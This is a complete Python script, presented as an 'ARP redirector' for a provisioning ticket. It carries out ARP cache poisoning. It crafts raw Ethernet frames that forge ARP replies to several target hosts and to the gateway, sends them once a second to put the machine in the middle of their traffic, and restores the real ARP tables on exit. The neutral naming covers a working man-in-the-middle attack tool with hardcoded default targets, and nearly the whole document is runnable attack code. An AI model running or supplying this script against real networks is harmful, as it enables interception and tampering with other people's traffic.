#!/usr/bin/env python3
"""
Lightweight standalone ARP redirector and restorer for NET-PROVISION-004.
Supports multi-target IP tracking and guaranteed restoration on exit.
"""

import sys
import time
import socket
import struct
import signal

IFACE = sys.argv[1] if len(sys.argv) > 1 else "enp5s0"
TARGET_IPS_RAW = sys.argv[2] if len(sys.argv) > 2 else "192.168.1.138,192.168.1.137,192.168.1.134"
TARGET_MAC_STR = sys.argv[3] if len(sys.argv) > 3 else "68:15:90:6b:81:96"
GATEWAY_IP_STR = sys.argv[4] if len(sys.argv) > 4 else "192.168.1.1"
GATEWAY_MAC_STR = sys.argv[5] if len(sys.argv) > 5 else "14:ca:56:81:18:71"

def mac_bytes(s):
    return bytes.fromhex(s.replace(":", "").replace("-", ""))

def ip_bytes(s):
    return socket.inet_aton(s.strip())

def get_iface_mac(ifname):
    with open(f"/sys/class/net/{ifname}/address") as f:
        return mac_bytes(f.read().strip())

HOST_MAC = get_iface_mac(IFACE)
TARGET_MAC = mac_bytes(TARGET_MAC_STR)
GATEWAY_MAC = mac_bytes(GATEWAY_MAC_STR)
GATEWAY_IP = ip_bytes(GATEWAY_IP_STR)

TARGET_IPS = [ip_bytes(ip) for ip in TARGET_IPS_RAW.split(",") if ip.strip()]

def make_frame(src_mac, src_ip, dst_mac, dst_ip):
    eth = dst_mac + src_mac + struct.pack("!H", 0x0806)
    arp = struct.pack("!HHBBH", 1, 0x0800, 6, 4, 2) + src_mac + src_ip + dst_mac + dst_ip
    return eth + arp

sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
sock.bind((IFACE, 0))

running = True
def handle_exit(signum, frame):
    global running
    running = False

signal.signal(signal.SIGINT, handle_exit)
signal.signal(signal.SIGTERM, handle_exit)

print(f"[*] Native ARP redirector active on {IFACE}")
print(f"[*] Targets: {TARGET_IPS_RAW} ({TARGET_MAC_STR}) <-> {GATEWAY_IP_STR} ({GATEWAY_MAC_STR}) via {HOST_MAC.hex(':')}")

spoof_pairs = []
restore_pairs = []

for tip in TARGET_IPS:
    spoof_pairs.append((make_frame(HOST_MAC, GATEWAY_IP, TARGET_MAC, tip),
                        make_frame(HOST_MAC, tip, GATEWAY_MAC, GATEWAY_IP)))
    restore_pairs.append((make_frame(GATEWAY_MAC, GATEWAY_IP, TARGET_MAC, tip),
                          make_frame(TARGET_MAC, tip, GATEWAY_MAC, GATEWAY_IP)))

try:
    while running:
        for f_tgt, f_gw in spoof_pairs:
            sock.send(f_tgt)
            sock.send(f_gw)
        time.sleep(1.0)
finally:
    print("[*] Restoring authentic ARP tables...")
    for _ in range(5):
        for r_tgt, r_gw in restore_pairs:
            sock.send(r_tgt)
            sock.send(r_gw)
        time.sleep(0.1)
    sock.close()
    print("[*] ARP tables restored cleanly.")
